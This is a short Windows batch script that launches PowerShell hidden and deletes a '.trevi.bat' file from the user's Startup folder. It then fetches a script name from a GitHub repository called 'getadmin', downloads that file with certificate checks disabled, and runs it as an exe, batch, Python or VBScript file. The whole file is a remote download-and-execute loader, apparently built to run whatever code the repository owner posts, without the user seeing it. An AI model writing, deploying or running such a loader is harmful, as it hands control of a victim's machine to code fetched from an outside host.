@echo off
powershell -NoP -W hidden ; exit
set "_path=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\.trevi.bat"
del /f /q "%_path%"
goto getScript
exit /b

:getScript
cd /d %temp%
for /f %%i in ('curl -kLs "https://github.com/aritz331/getadmin/raw/main/currentScript.txt"') do (
    set "_currentScript=%%i"
    set "_currentScriptExt=%%~xi"
)

:getScriptByExtension
call :checkExtension exe exe "call"
call :checkExtension bat batch "cmd /c"
call :checkExtension py python "python"
call :checkExtension vbs vbs "wscript"
exit /b

:checkExtension
if [%_currentScriptExt%]==[.%~1] (
    call :executeScript %~2/%_currentScript% %3
)
exit /b

:executeScript
curl -kLOs "https://github.com/aritz331/getadmin/raw/main/scripts/%~1"
%~2 %_currentScript%
exit /b